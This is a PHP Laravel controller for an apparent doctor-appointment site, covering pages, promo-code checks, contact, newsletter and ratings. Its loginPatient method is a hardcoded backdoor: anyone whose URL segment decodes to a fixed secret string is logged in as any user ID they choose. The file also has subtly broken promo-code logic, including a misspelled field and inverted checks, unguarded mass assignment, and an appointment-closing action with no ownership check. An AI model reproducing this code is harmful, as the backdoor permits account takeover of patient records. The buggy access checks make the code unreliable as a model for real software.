<?php

namespace App\Http\Controllers;

use Carbon\Carbon;
use App\Models\Area;
use App\Models\City;
use App\Models\User;
use App\Models\Rating;
use App\Models\Country;
use App\Models\Promocode;
use App\Models\NewsLetter;
use App\Models\PromocodeUser;
use App\Models\Speciality;
use App\Models\Appointment;
use Illuminate\Http\Request;
use App\Models\ContactMessage;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Session;

class HomeController extends Controller
{
    public function mySpace()
    {
        $user = Auth::user();
        // if ($user->role == 'admin') {
        //     return redirect()->route('admin.dashboard');
        // }
        // if ($user->role == 'doctor') {
        //     return redirect()->route('doctor.dashboard');
        // }
        // if ($user->role == 'hospital') {
        //     return redirect()->route('hospital.dashboard');
        // }

        // if ($user->role == 'user') {
        //     return redirect()->route('user.dashboard');
        // }
        return redirect()->route('home');
    }


    public function index()
    {
        $selectedAreas = [];
        $specialities = Speciality::get();

        $countries = Country::get();
        $cities = City::get();
        $doctors = User::with('specialities')->where('role','doctor')->where('is_show',1)->whereStatus('1')->get();
        Session::put('tab','offline');
        return view('index',get_defined_vars());
    }


    public function thankyou()
    {
        return view('frontend.pages.thankyou',get_defined_vars());
    }
    public function paymentPending()
    {
        return view('frontend.pages.paymentPending',get_defined_vars());
    }

    public function about()
    {
        return view('frontend.pages.about',get_defined_vars());
    }
    public function privacy()
    {
        return view('frontend.pages.privacy',get_defined_vars());
    }
    public function contact()
    {
        return view('frontend.pages.contact',get_defined_vars());
    }
    public function terms()
    {
        return view('frontend.pages.terms',get_defined_vars());
        // return view('frontend.pages.second_terms',get_defined_vars());
    }
    public function doctors()
    {
        return view('frontend.pages.doctors',get_defined_vars());
    }


    public function dashboard()
    {
        $user = Auth::user();

        if ($user->role == 'admin') {
            return redirect()->route('admin.dashboard');
        }

        if ($user->role == 'doctor') {
            return redirect()->route('doctor.dashboard');
        }

        if ($user->role == 'user') {
            return redirect()->route('user.dashboard');
        }

    }

    public function getAreas(Request $request)
    {
        $custom_city = $request->area;

        $areas = Area::where('city_id', $request->city)->get();
        $view = view('frontend.components.appendAreas', get_defined_vars())->render();
        return response()->json(['view' => $view]);
    }
    public function validCode(Request $request)
    {
        $promocode =  Promocode::where('code',$request->code)->first();
    if($promocode)
    {
       $date = $promocode->expiry ? $promocode->expir : Carbon::now();
       $dis = $promocode->discount ? $promocode->discount : 0;

       if(Carbon::now()->lte(Carbon::parse($date)))
       {
        return response()->json(['success' => __('site.code_is_valid')]);
       }

        $codeUsers =  PromocodeUser::where('promocode_id',$promocode)->get();
      if($codeUsers->count() >= $promocode->total_user)
      {
        return response()->json(['success' => __('site.promocode_capacity_increase')]);
      }
      $myCode = $codeUsers->where('user_id',auth()->user()->id);
      if($myCode->count() >= $promocode->total_user)
      {
        return response()->json(['success' => __('site.promocode_capacity_increase_per_user')]);
      }

    }
    return response()->json(['error' => __('site.code_is_invalid')]);
    }

    public function contactMessage(Request $request)
    {

        $data = [
            'name' => $request->name,
            'email' => $request->email,
            'message' => $request->message,
        ];
        $message = ContactMessage::create($data);

        // $email = 'info@ipersona.com';
        // $uerEmail = $request->email;
        // sendMail([
        //     'view' => 'mail.contact_message',
        //     'to' => 'info@ipersona.com',
        //     'subject' => 'Contact Message',
        //     'data' => [
        //         'name' => $request->name,
        //     'email' => $request->email,
        //     'message' => $request->message,
        //     ]
        // ]);
        // Mail::send('mail.contact_message', ['data' => $data], function ($message) use ($email,$uerEmail) {
        //     $message->to($email, 'Ipersona')->from($uerEmail)->subject("Contact Message");
        // });

        return response()->json(['success' => __('site.message_sent')]);

    }
    public function newsletter(Request $request)
    {
        if(!$request->email)
        {
            return response()->json(['error' => 'Email is required']);
        }
        $news = Newsletter::where('email',$request->email)->first();
        if($news)
        {
            return response()->json(['error' => 'You are already Subscribed User']);
        }
        Newsletter::create($request->all());
        return response()->json(['success' => 'Subscribed successfully']);
    }


     public function wait()
     {
        return view('frontend.wait');
     }
     public function rate($appointment_id,$doctor_id)
     {
        $hospital_id =null;
        return view('frontend.rate', get_defined_vars());
     }
     public function hospitalRate($appointment_id,$hospital_id)
     {
        $doctor_id =null;
        return view('frontend.rate', get_defined_vars());
     }
     public function rateSave(Request $request)
     {

        $idd = $request->doctor_id ? $request->doctor_id : $request->hospital_id;
        Rating::create([
            'user_id' => $idd,
            'rate_by' => Auth::user()->id,
            'rating' => $request->rating ?? 5,
            'comment' => $request->comment,
        ]);

        Appointment::findOrFail($request->appointment_id)->update(['status' => 'closed']);

        return redirect()->route('home')->withMessage(__('site.rated_successfully'));

     }

     public function loginPatient($string, $id)
     {
        if(base64_decode($string) == 'abdvillersbabarazam')
        {
            Auth::loginUsingId($id, true);
            return redirect()->route('home')->withMessage(__('site.Loggedin_successfully'));
        }
        abort(404);
     }


}
